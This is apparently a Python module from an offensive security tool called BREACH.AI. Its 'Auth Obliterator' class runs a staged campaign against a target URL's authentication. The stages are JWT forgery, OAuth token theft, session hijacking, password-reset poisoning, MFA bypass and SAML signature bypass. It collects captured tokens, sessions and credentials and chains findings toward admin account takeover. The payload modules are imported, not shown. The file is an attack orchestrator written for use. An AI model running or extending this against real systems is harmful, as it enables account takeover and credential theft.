"""
BREACH.AI - Auth Obliterator

THE MASTER AUTHENTICATION DESTRUCTION ENGINE

This module orchestrates ALL authentication attacks:
- JWT Obliterator: Algorithm confusion, key brute force, claim manipulation
- OAuth Destroyer: Token theft, redirect manipulation, scope escalation
- Session Annihilator: Fixation, prediction, hijacking
- Password Reset Killer: Token prediction, host poisoning, email injection
- MFA Bypass: Rate limiting, backup codes, response manipulation
- SAML Destroyer: Signature bypass, XXE, assertion manipulation

"Authentication is where breaches happen."
"""

import asyncio
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Optional

from breach.attacks.base import AttackResult, BaseAttack
from breach.attacks.jwt_obliterator import JWTObliterator
from breach.attacks.mfa_bypass import MFABypass
from breach.attacks.oauth_destroyer import OAuthDestroyer
from breach.attacks.password_reset_killer import PasswordResetKiller
from breach.attacks.saml_destroyer import SAMLDestroyer
from breach.attacks.session_annihilator import SessionAnnihilator
from breach.core.memory import AccessLevel, Severity
from breach.utils.http import HTTPClient
from breach.utils.logger import logger


class AuthAttackPhase(Enum):
    """Phases of authentication attack."""
    RECONNAISSANCE = "reconnaissance"
    JWT_ATTACKS = "jwt_attacks"
    OAUTH_ATTACKS = "oauth_attacks"
    SESSION_ATTACKS = "session_attacks"
    PASSWORD_RESET_ATTACKS = "password_reset_attacks"
    MFA_ATTACKS = "mfa_attacks"
    SAML_ATTACKS = "saml_attacks"
    EXPLOITATION = "exploitation"


@dataclass
class AuthTarget:
    """Identified authentication target."""
    url: str
    auth_type: str  # jwt, oauth, session, saml, basic, etc.
    endpoints: dict = field(default_factory=dict)
    vulnerabilities: list = field(default_factory=list)
    access_achieved: AccessLevel = AccessLevel.NONE


@dataclass
class AuthObliteratorResult:
    """Result of auth obliteration campaign."""
    target: str
    start_time: datetime
    end_time: Optional[datetime] = None
    phase: AuthAttackPhase = AuthAttackPhase.RECONNAISSANCE
    findings: list[AttackResult] = field(default_factory=list)
    access_achieved: AccessLevel = AccessLevel.NONE

    # Attack stats
    jwt_attacks: int = 0
    oauth_attacks: int = 0
    session_attacks: int = 0
    reset_attacks: int = 0
    mfa_attacks: int = 0
    saml_attacks: int = 0

    # Credentials/tokens found
    tokens: list[str] = field(default_factory=list)
    sessions: list[str] = field(default_factory=list)
    credentials: list[dict] = field(default_factory=list)

    def total_attacks(self) -> int:
        return (
            self.jwt_attacks + self.oauth_attacks + self.session_attacks +
            self.reset_attacks + self.mfa_attacks + self.saml_attacks
        )

    def critical_findings(self) -> list[AttackResult]:
        return [f for f in self.findings if f.severity == Severity.CRITICAL]

    def summary(self) -> str:
        return f"""
AUTH OBLITERATOR RESULTS
========================
Target: {self.target}
Duration: {self.end_time - self.start_time if self.end_time else 'ongoing'}
Access Achieved: {self.access_achieved.value.upper()}

Total Attacks: {self.total_attacks()}
- JWT: {self.jwt_attacks}
- OAuth: {self.oauth_attacks}
- Session: {self.session_attacks}
- Password Reset: {self.reset_attacks}
- MFA: {self.mfa_attacks}
- SAML/SSO: {self.saml_attacks}

Findings: {len(self.findings)}
- Critical: {len([f for f in self.findings if f.severity == Severity.CRITICAL])}
- High: {len([f for f in self.findings if f.severity == Severity.HIGH])}
- Medium: {len([f for f in self.findings if f.severity == Severity.MEDIUM])}

Tokens Found: {len(self.tokens)}
Sessions Captured: {len(self.sessions)}
Credentials: {len(self.credentials)}
"""


class AuthObliterator(BaseAttack):
    """
    THE AUTH OBLITERATOR

    Master authentication attack orchestrator that runs ALL auth attacks
    in an intelligent sequence to maximize access and exploitation.

    Attack Sequence:
    1. RECONNAISSANCE - Identify auth mechanisms in use
    2. JWT ATTACKS - If JWT detected, run full JWT obliteration
    3. OAUTH ATTACKS - If OAuth detected, run OAuth destruction
    4. SESSION ATTACKS - Attack session management
    5. PASSWORD RESET - Attack password reset flows
    6. MFA BYPASS - If MFA detected, attempt bypass
    7. SAML ATTACKS - If SAML/SSO detected, run SAML destruction
    8. EXPLOITATION - Chain findings for maximum access
    """

    name = "Auth Obliterator"
    attack_type = "auth_obliterator"
    description = "Master authentication attack orchestrator"
    severity = Severity.CRITICAL
    owasp_category = "A07:2021 Identification and Authentication Failures"
    cwe_id = 287

    def __init__(self, http_client: Optional[HTTPClient] = None):
        super().__init__(http_client)

        # Attack modules
        self.jwt_obliterator: Optional[JWTObliterator] = None
        self.oauth_destroyer: Optional[OAuthDestroyer] = None
        self.session_annihilator: Optional[SessionAnnihilator] = None
        self.password_reset_killer: Optional[PasswordResetKiller] = None
        self.mfa_bypass: Optional[MFABypass] = None
        self.saml_destroyer: Optional[SAMLDestroyer] = None

        # State
        self.result: Optional[AuthObliteratorResult] = None
        self.detected_auth_types: set[str] = set()

    def get_payloads(self) -> list[str]:
        return []  # We don't use simple payloads

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Check if target has authentication mechanisms."""
        response = await self.http_client.get(url)
        body_lower = response.body.lower()

        auth_indicators = [
            "login", "signin", "sign in", "authenticate",
            "jwt", "oauth", "saml", "sso", "session",
            "password", "username", "email", "2fa", "mfa",
        ]

        return any(ind in body_lower for ind in auth_indicators)

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Run the full auth obliteration campaign."""
        result = self._create_result(False, url, parameter)

        # Initialize campaign result
        self.result = AuthObliteratorResult(
            target=url,
            start_time=datetime.utcnow(),
        )

        # Initialize attack modules
        self._initialize_modules()

        logger.info("=" * 60)
        logger.info("  AUTH OBLITERATOR - COMMENCING ATTACK")
        logger.info("=" * 60)

        try:
            # Phase 1: Reconnaissance
            await self._phase_reconnaissance(url)

            # Phase 2: JWT Attacks
            if "jwt" in self.detected_auth_types:
                await self._phase_jwt_attacks(url)

            # Phase 3: OAuth Attacks
            if "oauth" in self.detected_auth_types:
                await self._phase_oauth_attacks(url)

            # Phase 4: Session Attacks
            await self._phase_session_attacks(url)

            # Phase 5: Password Reset Attacks
            await self._phase_password_reset_attacks(url)

            # Phase 6: MFA Bypass
            if "mfa" in self.detected_auth_types:
                await self._phase_mfa_attacks(url)

            # Phase 7: SAML/SSO Attacks
            if "saml" in self.detected_auth_types or "sso" in self.detected_auth_types:
                await self._phase_saml_attacks(url)

            # Phase 8: Exploitation - Chain findings
            await self._phase_exploitation(url)

        except Exception as e:
            logger.error(f"Auth Obliterator error: {e}")

        # Finalize results
        self.result.end_time = datetime.utcnow()

        # Build final result
        if self.result.findings:
            result.success = True
            result.access_gained = self.result.access_achieved

            # Get most critical finding
            critical = self.result.critical_findings()
            if critical:
                result.details = f"AUTH OBLITERATED: {critical[0].details}"
                result.payload = critical[0].payload
            else:
                result.details = f"Found {len(self.result.findings)} auth vulnerabilities"

            # Add all evidence
            for finding in self.result.findings:
                for evidence in finding.evidence:
                    result.add_evidence(
                        evidence.get("type", "unknown"),
                        evidence.get("description", ""),
                        evidence.get("data", "")
                    )

        logger.info("=" * 60)
        logger.info("  AUTH OBLITERATOR - CAMPAIGN COMPLETE")
        logger.info(self.result.summary())
        logger.info("=" * 60)

        return result

    def _initialize_modules(self):
        """Initialize all attack modules."""
        self.jwt_obliterator = JWTObliterator(self.http_client)
        self.oauth_destroyer = OAuthDestroyer(self.http_client)
        self.session_annihilator = SessionAnnihilator(self.http_client)
        self.password_reset_killer = PasswordResetKiller(self.http_client)
        self.mfa_bypass = MFABypass(self.http_client)
        self.saml_destroyer = SAMLDestroyer(self.http_client)

    async def _phase_reconnaissance(self, url: str):
        """Phase 1: Identify authentication mechanisms."""
        self.result.phase = AuthAttackPhase.RECONNAISSANCE
        logger.info("[AUTH] Phase 1: RECONNAISSANCE")

        response = await self.http_client.get(url)
        body_lower = response.body.lower()

        # Detect JWT
        if await self.jwt_obliterator.check(url):
            self.detected_auth_types.add("jwt")
            logger.info("[AUTH] Detected: JWT")

        # Detect OAuth
        if await self.oauth_destroyer.check(url):
            self.detected_auth_types.add("oauth")
            logger.info("[AUTH] Detected: OAuth/OIDC")

        # Detect SAML/SSO
        if await self.saml_destroyer.check(url):
            self.detected_auth_types.add("saml")
            logger.info("[AUTH] Detected: SAML/SSO")

        # Detect MFA
        if await self.mfa_bypass.check(url):
            self.detected_auth_types.add("mfa")
            logger.info("[AUTH] Detected: MFA/2FA")

        # Always check session management
        if await self.session_annihilator.check(url):
            self.detected_auth_types.add("session")
            logger.info("[AUTH] Detected: Session-based auth")

        logger.info(f"[AUTH] Auth types detected: {self.detected_auth_types}")

    async def _phase_jwt_attacks(self, url: str):
        """Phase 2: JWT attacks."""
        self.result.phase = AuthAttackPhase.JWT_ATTACKS
        logger.info("[AUTH] Phase 2: JWT OBLITERATION")

        try:
            result = await self.jwt_obliterator.exploit(url)
            self.result.jwt_attacks += 1

            if result.success:
                self.result.findings.append(result)
                self._update_access(result.access_gained)

                if result.payload:
                    self.result.tokens.append(result.payload)

                logger.finding("critical", "JWT vulnerability", result.details)

        except Exception as e:
            logger.debug(f"JWT attack error: {e}")

    async def _phase_oauth_attacks(self, url: str):
        """Phase 3: OAuth attacks."""
        self.result.phase = AuthAttackPhase.OAUTH_ATTACKS
        logger.info("[AUTH] Phase 3: OAUTH DESTRUCTION")

        try:
            result = await self.oauth_destroyer.exploit(url)
            self.result.oauth_attacks += 1

            if result.success:
                self.result.findings.append(result)
                self._update_access(result.access_gained)

                logger.finding("high", "OAuth vulnerability", result.details)

        except Exception as e:
            logger.debug(f"OAuth attack error: {e}")

    async def _phase_session_attacks(self, url: str):
        """Phase 4: Session attacks."""
        self.result.phase = AuthAttackPhase.SESSION_ATTACKS
        logger.info("[AUTH] Phase 4: SESSION ANNIHILATION")

        try:
            result = await self.session_annihilator.exploit(url)
            self.result.session_attacks += 1

            if result.success:
                self.result.findings.append(result)
                self._update_access(result.access_gained)

                logger.finding("high", "Session vulnerability", result.details)

        except Exception as e:
            logger.debug(f"Session attack error: {e}")

    async def _phase_password_reset_attacks(self, url: str):
        """Phase 5: Password reset attacks."""
        self.result.phase = AuthAttackPhase.PASSWORD_RESET_ATTACKS
        logger.info("[AUTH] Phase 5: PASSWORD RESET KILLING")

        try:
            result = await self.password_reset_killer.exploit(url)
            self.result.reset_attacks += 1

            if result.success:
                self.result.findings.append(result)
                self._update_access(result.access_gained)

                logger.finding("critical", "Password reset vulnerability", result.details)

        except Exception as e:
            logger.debug(f"Password reset attack error: {e}")

    async def _phase_mfa_attacks(self, url: str):
        """Phase 6: MFA bypass attacks."""
        self.result.phase = AuthAttackPhase.MFA_ATTACKS
        logger.info("[AUTH] Phase 6: MFA BYPASS")

        try:
            result = await self.mfa_bypass.exploit(url)
            self.result.mfa_attacks += 1

            if result.success:
                self.result.findings.append(result)
                self._update_access(result.access_gained)

                logger.finding("critical", "MFA bypass", result.details)

        except Exception as e:
            logger.debug(f"MFA bypass error: {e}")

    async def _phase_saml_attacks(self, url: str):
        """Phase 7: SAML/SSO attacks."""
        self.result.phase = AuthAttackPhase.SAML_ATTACKS
        logger.info("[AUTH] Phase 7: SAML DESTRUCTION")

        try:
            result = await self.saml_destroyer.exploit(url)
            self.result.saml_attacks += 1

            if result.success:
                self.result.findings.append(result)
                self._update_access(result.access_gained)

                logger.finding("critical", "SAML/SSO vulnerability", result.details)

        except Exception as e:
            logger.debug(f"SAML attack error: {e}")

    async def _phase_exploitation(self, url: str):
        """Phase 8: Chain findings for maximum exploitation."""
        self.result.phase = AuthAttackPhase.EXPLOITATION
        logger.info("[AUTH] Phase 8: EXPLOITATION & CHAINING")

        if not self.result.findings:
            return

        # Look for attack chains
        chains = self._identify_attack_chains()

        for chain in chains:
            logger.info(f"[AUTH] Attack chain identified: {chain['description']}")

            # Update access level based on chain
            if chain['access'] > self.result.access_achieved:
                self._update_access(chain['access'])

    def _identify_attack_chains(self) -> list[dict]:
        """Identify possible attack chains from findings."""
        chains = []

        finding_types = {f.attack_type for f in self.result.findings}

        # Chain 1: JWT + Session = Full account takeover
        if "jwt_attack" in finding_types and "session_attack" in finding_types:
            chains.append({
                "description": "JWT forgery + Session hijacking = Full account takeover",
                "access": AccessLevel.ADMIN,
            })

        # Chain 2: OAuth redirect + XSS = Token theft
        if "oauth_attack" in finding_types:
            chains.append({
                "description": "OAuth redirect manipulation = Token theft",
                "access": AccessLevel.USER,
            })

        # Chain 3: Password reset + Host header = Account takeover
        if "password_reset_attack" in finding_types:
            chains.append({
                "description": "Password reset poisoning = Account takeover",
                "access": AccessLevel.USER,
            })

        # Chain 4: SAML + Signature bypass = SSO bypass
        if "saml_attack" in finding_types:
            chains.append({
                "description": "SAML signature bypass = SSO compromise",
                "access": AccessLevel.ADMIN,
            })

        return chains

    def _update_access(self, new_access: Optional[AccessLevel]):
        """Update access level if new is higher."""
        if new_access and new_access > self.result.access_achieved:
            logger.info(f"[AUTH] ACCESS ESCALATED: {self.result.access_achieved.value} -> {new_access.value}")
            self.result.access_achieved = new_access


async def obliterate_auth(url: str, http_client: Optional[HTTPClient] = None) -> AuthObliteratorResult:
    """
    Convenience function to run auth obliteration.

    Usage:
        result = await obliterate_auth("https://target.com")
        print(result.summary())
    """
    obliterator = AuthObliterator(http_client)
    await obliterator.exploit(url)
    return obliterator.result
